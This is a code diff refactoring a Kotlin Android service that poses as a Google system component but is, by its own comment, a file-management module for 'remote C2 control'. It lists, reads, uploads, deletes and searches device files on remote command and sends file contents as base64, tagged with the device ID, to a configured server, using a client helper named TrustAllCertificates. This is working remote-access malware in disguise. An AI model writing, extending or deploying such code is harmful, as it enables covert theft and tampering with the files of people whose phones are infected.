@@ -1,31 +1,25 @@
 package com.google.android.systemservice.services
 
-import android.app.Service
 import android.content.Intent
 import android.os.Environment
-import android.os.IBinder
 import android.util.Log
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.TrustAllCertificates
 import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.MultipartBody
 import okhttp3.Request
-import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
-import java.nio.file.Files
-import java.nio.file.StandardCopyOption
 import android.util.Base64
 
 /**
  * File browser service — comprehensive file management for remote C2 control.
  * Handles: list, download, upload, delete, rename, move, search, preview
  */
-class FileBrowserService : Service() {
+class FileBrowserService : BaseService() {
 
     companion object {
         private const val TAG = "FileBrowser"
@@ -35,6 +29,9 @@ class FileBrowserService : Service() {
 
         private val BLOCKED_PREFIXES = listOf("/data/data/", "/system/", "/proc/", "/dev/")
     }
+
+    override val serviceTag = TAG
+    override val foregroundServiceId = 0 // FileBrowserService doesn't use foreground notification
 
     private fun isPathSafe(path: String): Boolean {
         return try {
@@ -60,6 +57,28 @@ class FileBrowserService : Service() {
         } catch (e: Exception) {
             Log.w(TAG, "Path safety check failed for $path: ${e.message}")
             false
+        }
+    }
+
+    /** Validates path safety and returns the File, or sends an error and returns null. */
+    private fun validatePath(path: String, requestId: String?, tag: String): File? {
+        if (!isPathSafe(path)) {
+            Log.w(TAG, "Path traversal blocked for $tag: $path")
+            sendErrorResponse(requestId, "Access denied: path not allowed")
+            return null
+        }
+        return File(path)
+    }
+
+    /** Builds a standard success response JSON with common fields pre-filled. */
+    private fun buildResponse(action: String, requestId: String?, block: JSONObject.() -> Unit): JSONObject {
+        return JSONObject().apply {
+            put("action", action)
+            put("command", action)
+            put("success", true)
+            put("timestamp", System.currentTimeMillis())
+            put("request_id", requestId ?: "")
+            block()
         }
     }
 
@@ -135,41 +154,25 @@ class FileBrowserService : Service() {
         return START_NOT_STICKY
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
-
     override fun onDestroy() {
-        stopForeground(false)
         super.onDestroy()
     }
 
     private fun listFiles(requestId: String?, path: String, recursive: Boolean) {
-        if (!isPathSafe(path)) {
-            Log.w(TAG, "Path traversal blocked for listFiles: $path")
-            sendErrorResponse(requestId, "Access denied: path not allowed")
-            return
-        }
+        val dir = validatePath(path, requestId, "listFiles") ?: return
         try {
-            val dir = File(path)
             if (!dir.exists() || !dir.isDirectory) {
                 sendErrorResponse(requestId, "Not a directory: $path")
                 return
             }
 
-            val entries = if (recursive) {
-                listFilesRecursive(dir)
-            } else {
-                listFilesSingle(dir)
-            }
+            val entries = if (recursive) listFilesRecursive(dir) else listFilesSingle(dir)
 
-            sendResponse(requestId, JSONObject().apply {
-                put("action", "list_files")
-                put("command", "list_files")
+            sendResponse(requestId, buildResponse("list_files", requestId) {
                 put("path", path)
                 put("parent", dir.parent ?: "/")
                 put("entries", entries)
                 put("count", entries.length())
-                put("success", true)
-                put("timestamp", System.currentTimeMillis())
             })
         } catch (e: Exception) {
             Log.e(TAG, "Error listing $path: ${e.message}")
@@ -219,36 +222,24 @@ class FileBrowserService : Service() {
     }
 
     private fun downloadFile(requestId: String?, path: String) {
-        if (!isPathSafe(path)) {
-            Log.w(TAG, "Path traversal blocked for downloadFile: $path")
-            sendErrorResponse(requestId, "Access denied: path not allowed")
-            return
-        }
+        val file = validatePath(path, requestId, "downloadFile") ?: return
         try {
-            val file = File(path)
             if (!file.exists() || !file.isFile) {
                 sendErrorResponse(requestId, "File not found: $path")
                 return
             }
-
             if (!file.canRead()) {
                 sendErrorResponse(requestId, "Permission denied: $path")
                 return
             }
 
-            // For files under 5MB, send base64
             if (file.length() <= CHUNK_SIZE) {
-                val bytes = file.readBytes()
-                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                sendResponse(requestId, JSONObject().apply {
-                    put("action", "download_file")
-                    put("command", "download_file")
+                val base64 = Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
+                sendResponse(requestId, buildResponse("download_file", requestId) {
                     put("path", path)
                     put("filename", file.name)
                     put("size", file.length())
                     put("content_base64", base64)
-                    put("success", true)
-                    put("timestamp", System.currentTimeMillis())
                 })
             } else {
                 sendErrorResponse(requestId, "File too large (>5MB): ${file.length()} bytes. Use chunked download.")
@@ -267,28 +258,18 @@ class FileBrowserService : Service() {
             return
         }
         try {
-            // Decode base64 content
             val content = Base64.decode(contentBase64, Base64.NO_WRAP)
-
-            // Create destination file
             val destDir = File(destinationPath)
-            if (!destDir.exists()) {
-                destDir.mkdirs()
-            }
+            if (!destDir.exists()) destDir.mkdirs()
 
             val destFile = File(destDir, filename)
             destFile.writeBytes(content)
 
-            sendResponse(requestId, JSONObject().apply {
-                put("action", "upload_file")
-                put("command", "upload_file")
+            sendResponse(requestId, buildResponse("upload_file", requestId) {
                 put("filename", filename)
                 put("path", destFile.absolutePath)
                 put("size", content.size)
-                put("success", true)
-                put("timestamp", System.currentTimeMillis())
             })
-
             Log.d(TAG, "File uploaded: ${destFile.absolutePath}")
         } catch (e: Exception) {
             Log.e(TAG, "Error uploading file: ${e.message}")
@@ -312,34 +293,21 @@ class FileBrowserService : Service() {
             return
         }
         try {
-            // Decode chunk data
             val chunk = Base64.decode(chunkData, Base64.NO_WRAP)
-
-            // Create temp directory for chunks
             val tempDir = File(cacheDir, "uploads/$uploadId")
-            if (!tempDir.exists()) {
-                tempDir.mkdirs()
-            }
+            if (!tempDir.exists()) tempDir.mkdirs()
 
-            // Save chunk
-            val chunkFile = File(tempDir, "chunk_$chunkIndex")
-            chunkFile.writeBytes(chunk)
-
+            File(tempDir, "chunk_$chunkIndex").writeBytes(chunk)
             Log.d(TAG, "Chunk $chunkIndex/$totalChunks saved for upload $uploadId")
 
-            // If this is the last chunk, assemble the file
             if (chunkIndex == totalChunks - 1) {
                 assembleChunkedFile(uploadId, totalChunks, filename, destinationPath, requestId)
             } else {
-                // Send progress update
-                sendResponse(requestId, JSONObject().apply {
-                    put("action", "upload_file_chunk")
-                    put("command", "upload_file_chunk")
+                sendResponse(requestId, buildResponse("upload_file_chunk", requestId) {
                     put("upload_id", uploadId)
                     put("chunk_index", chunkIndex)
                     put("total_chunks", totalChunks)
                     put("progress", ((chunkIndex + 1) * 100) / totalChunks)
-                    put("success", true)
                 })
             }
         } catch (e: Exception) {
@@ -358,37 +326,25 @@ class FileBrowserService : Service() {
         try {
             val tempDir = File(cacheDir, "uploads/$uploadId")
             val destDir = File(destinationPath)
-            if (!destDir.exists()) {
-                destDir.mkdirs()
-            }
+            if (!destDir.exists()) destDir.mkdirs()
 
             val destFile = File(destDir, filename)
             FileOutputStream(destFile).use { output ->
                 for (i in 0 until totalChunks) {
                     val chunkFile = File(tempDir, "chunk_$i")
-                    if (!chunkFile.exists()) {
-                        throw Exception("Missing chunk $i")
-                    }
-                    FileInputStream(chunkFile).use { input ->
-                        input.copyTo(output)
-                    }
+                    if (!chunkFile.exists()) throw Exception("Missing chunk $i")
+                    FileInputStream(chunkFile).use { input -> input.copyTo(output) }
                 }
             }
 
-            // Clean up temp files
             tempDir.deleteRecursively()
 
-            sendResponse(requestId, JSONObject().apply {
-                put("action", "upload_file")
-                put("command", "upload_file")
+            sendResponse(requestId, buildResponse("upload_file", requestId) {
                 put("filename", filename)
                 put("path", destFile.absolutePath)
                 put("size", destFile.length())
-                put("success", true)
                 put("message", "Chunked upload completed")
-                put("timestamp", System.currentTimeMillis())
             })
-
             Log.d(TAG, "Chunked file assembled: ${destFile.absolutePath}")
         } catch (e: Exception) {
             Log.e(TAG, "Error assembling chunks: ${e.message}")
@@ -397,31 +353,18 @@ class FileBrowserService : Service() {
     }
 
     private fun deleteFile(requestId: String?, path: String) {
-        if (!isPathSafe(path)) {
-            Log.w(TAG, "Path traversal blocked for deleteFile: $path")
-            sendErrorResponse(requestId, "Access denied: path not allowed")
-            return
-        }
+        val file = validatePath(path, requestId, "deleteFile") ?: return
         try {
-            val file = File(path)
             if (!file.exists()) {
                 sendErrorResponse(requestId, "File not found: $path")
                 return
             }
 
-            val success = if (file.isDirectory) {
-                file.deleteRecursively()
-            } else {
-                file.delete()
-            }
+            val success = if (file.isDirectory) file.deleteRecursively() else file.delete()
 
             if (success) {
-                sendResponse(requestId, JSONObject().apply {
-                    put("action", "delete_file")
-                    put("command", "delete_file")
+                sendResponse(requestId, buildResponse("delete_file", requestId) {
                     put("path", path)
-                    put("success", true)
-                    put("timestamp", System.currentTimeMillis())
                 })
                 Log.d(TAG, "Deleted: $path")
             } else {
@@ -434,24 +377,17 @@ class FileBrowserService : Service() {
     }
 
     private fun previewFile(requestId: String?, path: String, maxSize: Long) {
-        if (!isPathSafe(path)) {
-            Log.w(TAG, "Path traversal blocked for previewFile: $path")
-            sendErrorResponse(requestId, "Access denied: path not allowed")
-            return
-        }
+        val file = validatePath(path, requestId, "previewFile") ?: return
         try {
-            val file = File(path)
             if (!file.exists() || !file.isFile) {
                 sendErrorResponse(requestId, "File not found: $path")
                 return
             }
-
             if (file.length() > maxSize) {
                 sendErrorResponse(requestId, "File too large for preview: ${file.length()} bytes")
                 return
             }
 
-            // Determine content type
             val contentType = determineContentType(file)
             val content = when {
                 contentType.startsWith("text/") -> file.readText()
@@ -459,16 +395,12 @@ class FileBrowserService : Service() {
                 else -> "Binary file (${file.length()} bytes)"
             }
 
-            sendResponse(requestId, JSONObject().apply {
-                put("action", "preview_file")
-                put("command", "preview_file")
+            sendResponse(requestId, buildResponse("preview_file", requestId) {
                 put("filename", file.name)
                 put("path", path)
                 put("content_type", contentType)
                 put("content", content)
                 put("size", file.length())
-                put("success", true)
-                put("timestamp", System.currentTimeMillis())
             })
         } catch (e: Exception) {
             Log.e(TAG, "Error previewing $path: ${e.message}")
@@ -477,29 +409,18 @@ class FileBrowserService : Service() {
     }
 
     private fun renameFile(requestId: String?, oldPath: String, newName: String) {
-        if (!isPathSafe(oldPath)) {
-            Log.w(TAG, "Path traversal blocked for renameFile: $oldPath")
-            sendErrorResponse(requestId, "Access denied: path not allowed")
-            return
-        }
+        val file = validatePath(oldPath, requestId, "renameFile") ?: return
         try {
-            val file = File(oldPath)
             if (!file.exists()) {
                 sendErrorResponse(requestId, "File not found: $oldPath")
                 return
             }
 
             val newFile = File(file.parent, newName)
-            val success = file.renameTo(newFile)
-
-            if (success) {
-                sendResponse(requestId, JSONObject().apply {
-                    put("action", "rename_file")
-                    put("command", "rename_file")
+            if (file.renameTo(newFile)) {
+                sendResponse(requestId, buildResponse("rename_file", requestId) {
                     put("old_path", oldPath)
                     put("new_path", newFile.absolutePath)
-                    put("success", true)
-                    put("timestamp", System.currentTimeMillis())
                 })
                 Log.d(TAG, "Renamed: $oldPath -> ${newFile.absolutePath}")
             } else {
@@ -525,39 +446,15 @@ class FileBrowserService : Service() {
             }
 
             val destFile = File(destinationPath)
-            if (destFile.isDirectory) {
-                // Moving into directory
-                val finalDest = File(destFile, sourceFile.name)
-                val success = sourceFile.renameTo(finalDest)
-                
-                if (success) {
-                    sendResponse(requestId, JSONObject().apply {
-                        put("action", "move_file")
-                        put("command", "move_file")
-                        put("source_path", sourcePath)
-                        put("destination_path", finalDest.absolutePath)
-                        put("success", true)
-                        put("timestamp", System.currentTimeMillis())
-                    })
-                } else {
-                    sendErrorResponse(requestId, "Failed to move file")
-                }
+            val finalDest = if (destFile.isDirectory) File(destFile, sourceFile.name) else destFile
+
+            if (sourceFile.renameTo(finalDest)) {
+                sendResponse(requestId, buildResponse("move_file", requestId) {
+                    put("source_path", sourcePath)
+                    put("destination_path", finalDest.absolutePath)
+                })
             } else {
-                // Renaming/moving to specific path
-                val success = sourceFile.renameTo(destFile)
-                
-                if (success) {
-                    sendResponse(requestId, JSONObject().apply {
-                        put("action", "move_file")
-                        put("command", "move_file")
-                        put("source_path", sourcePath)
-                        put("destination_path", destFile.absolutePath)
-                        put("success", true)
-                        put("timestamp", System.currentTimeMillis())
-                    })
-                } else {
-                    sendErrorResponse(requestId, "Failed to move file")
-                }
+                sendErrorResponse(requestId, "Failed to move file")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error moving file: ${e.message}")
@@ -566,13 +463,8 @@ class FileBrowserService : Service() {
     }
 
     private fun searchFiles(requestId: String?, query: String, basePath: String) {
-        if (!isPathSafe(basePath)) {
-            Log.w(TAG, "Path traversal blocked for searchFiles: $basePath")
-            sendErrorResponse(requestId, "Access denied: path not allowed")
-            return
-        }
+        val baseDir = validatePath(basePath, requestId, "searchFiles") ?: return
         try {
-            val baseDir = File(basePath)
             if (!baseDir.exists() || !baseDir.isDirectory) {
                 sendErrorResponse(requestId, "Invalid base path: $basePath")
                 return
@@ -581,15 +473,11 @@ class FileBrowserService : Service() {
             val results = JSONArray()
             searchFilesRecursive(baseDir, query.lowercase(), results, 0, 100)
 
-            sendResponse(requestId, JSONObject().apply {
-                put("action", "search_files")
-                put("command", "search_files")
+            sendResponse(requestId, buildResponse("search_files", requestId) {
                 put("query", query)
                 put("base_path", basePath)
                 put("results", results)
                 put("count", results.length())
-                put("success", true)
-                put("timestamp", System.currentTimeMillis())
             })
         } catch (e: Exception) {
             Log.e(TAG, "Error searching files: ${e.message}")
@@ -634,7 +522,7 @@ class FileBrowserService : Service() {
             payload.put("device_id", AndroidConfig.deviceId)
             payload.put("request_id", requestId ?: "")
 
-            val client = TrustAllCertificates.createClientBuilder().build()
+            val client = TrustAllCertificates.createSecureClientBuilder().build()
             val body = payload.toString().toRequestBody("application/json".toMediaType())
             val request = Request.Builder()
                 .url("${AndroidConfig.apiBaseUrl}/file_browser")
